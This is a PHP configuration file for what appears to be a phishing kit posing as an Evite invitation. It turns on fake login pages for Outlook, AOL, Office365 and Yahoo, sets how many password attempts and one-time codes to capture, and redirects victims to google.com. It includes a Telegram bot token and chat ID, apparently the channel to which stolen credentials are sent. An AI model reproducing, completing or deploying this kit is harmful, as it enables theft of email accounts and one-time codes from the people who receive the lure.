<?php
declare(strict_types=1);

/** require __DIR__ . '/config.php'; */

$CONFIG = [
  'password_twice' => false,
  'otp_twice' => false,
  'success_redirect_url' => 'https://google.com',
  'default_sender' => 'Evite Guest Host',

  // Skip welcome prepage — land directly on login providers
  'skip_prepage' => true,
  // Wrong password attempts before OTP (default: 2)
  'password_retries' => 2,

  'telegram' => [
    'bot_token' => '9013226919:AAErUrhs__XQ3EYjZTJLqHqbbe_PFd6cAz8',
    'chat_id' => '6844146551',
    'log_visits' => true,
  ],

  'providers' => [
    'outlook' => [
      'enabled' => true,
      'redirect' => ['enabled' => false, 'url' => ''],
    ],
    'aol' => [
      'enabled' => true,
      'redirect' => ['enabled' => false, 'url' => ''],
    ],
    'office365' => [
      'enabled' => true,
      'redirect' => ['enabled' => false, 'url' => ''],
    ],
    'yahoo' => [
      'enabled' => true,
      'redirect' => ['enabled' => false, 'url' => ''],
    ],
    'other' => [
      'enabled' => true,
      'redirect' => ['enabled' => true, 'url' => './google/index.php'],
    ],
  ],
];
